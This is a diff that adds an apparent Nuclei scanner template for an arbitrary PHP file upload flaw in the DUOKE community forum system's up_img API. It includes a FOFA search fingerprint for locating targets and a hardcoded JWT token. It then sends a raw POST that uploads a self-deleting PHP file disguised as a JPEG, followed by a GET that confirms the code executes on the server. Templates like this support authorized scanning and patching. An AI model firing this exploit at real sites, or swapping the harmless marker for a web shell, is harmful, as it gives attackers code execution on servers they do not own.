@@ -1,0 +1,46 @@
+id: duoke-forum-up_img-upload
+
+info:
+  name: DUOKE多客圈子论坛社区系统 up_img 接口任意文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: "/static/index/js/jweixin-1.2.0.js"
+      
+      DUOKE多客圈子论坛社区系统为基于PHP的社区交互平台，集成小程序授权登录、移动端H5/APP接入、用户关系管理及内容发布功能。系统提供圈子创建、活动组织、帖子管理等模块，存在up_img接口未正确校验文件上传路径与类型限制，攻击者可构造恶意请求上传可执行文件。
+      
+  tags: DUOKE多客圈子论坛社区系统
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /index.php/api/User/up_img HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+    Connection: keep-alive
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrkWB0L5fVE0zhYng
+    token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjF9.VQtQaEk7rvMOGHV5dBlNjWpWtBL-gFNpKBMNXTX3_ns
+
+    ------WebKitFormBoundary03rNBzFMIytvpWhy
+    Content-Disposition: form-data; name="file"; filename="NTest.php"
+    Content-Type: image/jpeg
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    ------WebKitFormBoundary03rNBzFMIytvpWhy--
+- raw:
+  - |
+    GET /NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
